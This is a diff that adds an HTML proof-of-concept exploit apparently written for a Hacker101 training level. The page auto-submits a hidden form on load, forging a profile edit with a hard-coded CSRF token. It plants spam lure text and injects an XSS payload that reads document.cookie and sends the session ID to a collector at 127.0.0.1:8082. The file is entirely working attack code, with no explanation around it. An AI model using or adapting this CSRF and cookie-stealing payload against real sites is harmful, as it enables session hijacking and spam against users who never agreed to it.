@@ -1,0 +1,22 @@
+<html>
+<header>
+    <title>
+        BreakerProfile CSRF PoC
+    </title>
+</header>
+<script>
+        window.onload = function() {
+                document.forms.form1.submit()
+            }
+</script>
+
+<body>
+    <form action="https://levels-a.hacker101.com/levels/2/edit?id=undefined" method="POST" id="form1">
+        <!-- This is the token that was originally embeded in the site -->
+        <input name="csrf" value="2e2e2e4e6f7420746869732074696d6521c9536280bcd477f89585c41aef33ce2e" type="hidden">
+        <textarea name="desc" style="display:none">check out this SITE for EXCLUSIVE NUDES of FAMOUS PEOPLE http://127.0.0.1:8080</textarea>
+        <input type="text" name="pic" value="/&quot;onerror=&quot;console.log(document.cookie)&quot;&gt;&lt;script&gt;var a = new XMLHttpRequest({mozSystem: true}); a.open('GET', 'http://127.0.0.1:8082/incoming' + '?sessionId=' + document.cookie.replace('session=', ''), true); a.send(); &lt;/script&gt;&quot;.png"  style="display:none">
+        <input type="text" name="nickname" value="EXCLUSIVE NUDES http://127.0.0.1:8080" style="display:none">
+    </form>
+</body>
+</html>
